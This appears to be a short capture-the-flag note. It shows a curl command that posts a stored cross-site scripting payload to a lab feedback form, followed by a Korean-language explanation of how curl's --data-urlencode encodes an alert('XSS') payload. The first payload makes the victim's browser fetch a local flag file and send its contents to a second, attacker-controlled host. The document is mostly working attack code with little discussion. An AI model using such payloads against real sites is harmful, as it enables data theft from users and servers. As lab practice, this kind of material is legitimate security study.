curl -X POST http://10.10.59.111:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.59.111:8080" -H "Referer: http://10.10.59.111:8080/submit_feedback" --data-urlencode "feedback=<script>fetch('http://127.0.0.1:8080/flag.txt').then(response => response.text()).then(data => {fetch('http://10.8.136.212:9000?flag=' + encodeURIComponent(data));});</script>"

### ✅ `--data-urlencode` (자동 인코딩됨)

```bash
curl -X POST http://example.com \
--data-urlencode "feedback=<script>alert('XSS')</script>"
```

→ 실제 전송 값은 다음처럼 인코딩됨:

```
feedback=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```
